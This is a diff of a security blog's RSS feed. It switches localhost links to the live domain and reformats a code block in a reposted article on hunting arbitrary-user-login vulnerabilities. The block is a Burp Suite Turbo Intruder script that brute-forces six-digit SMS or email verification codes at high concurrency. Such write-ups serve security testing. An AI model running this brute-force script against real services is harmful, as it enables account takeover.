@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>用户登录 - 标签 - bysec</title>
-        <link>http://localhost:1313/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</link>
+        <link>https://www.bysec.cn/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</link>
         <description>用户登录 - 标签 - bysec</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
-            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" rel="self" type="application/rss+xml" /><item>
     <title>任意用户登录漏洞挖掘思路</title>
-    <link>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
+    <link>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
     <pubDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
+    </author><guid>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2553" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2553</a></em></p>
 </blockquote>
@@ -23,11 +23,47 @@
 <p>使用burpsuite的Turbo Intruder插件，编写如下脚本：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">re</span> <span class="nx">def</span> <span class="nx">queueRequests</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">wordlists</span><span class="p">)</span><span class="o">:</span> <span class="nx">engine</span> <span class="o">=</span> <span class="nx">RequestEngine</span><span class="p">(</span><span class="nx">endpoint</span><span class="o">=</span><span class="nx">target</span><span class="o">.</span><span class="nx">endpoint</span><span class="p">,</span> <span class="nx">concurrentConnections</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="nx">requestsPerConnection</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="nx">pipeline</span><span class="o">=</span><span class="k">True</span> <span class="p">)</span> <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">)</span><span class="o">:</span> <span class="c1">#生成六位验证码字典 number = &#34;{:06d}&#34;.format(i) engine.queue(target.req, number.rstrip()) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status &lt;404: &#39;&#39;&#39;res = re.findall(&#39;Msg&#34;:&#34;(.*?)&#34;&#39;,req.response)[0] if len(res)&gt;18:&#39;&#39;&#39; #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示 table.add(req)
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">pipeline</span><span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                           <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>                            <span class="c1">#生成六位验证码字典</span>
+</span></span><span class="line"><span class="cl">        <span class="n">number</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{:06d}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">number</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># currently available attributes are req.status, req.wordcount, req.length and req.response</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">status</span> <span class="o">&lt;</span><span class="mi">404</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;res = re.findall(&#39;Msg&#34;:&#34;(.*?)&#34;&#39;,req.response)[0]    
+</span></span></span><span class="line"><span class="cl"><span class="s1">        if len(res)&gt;18:&#39;&#39;&#39;</span>    <span class="c1">#六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示</span>
+</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>成功案例如下：</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg">
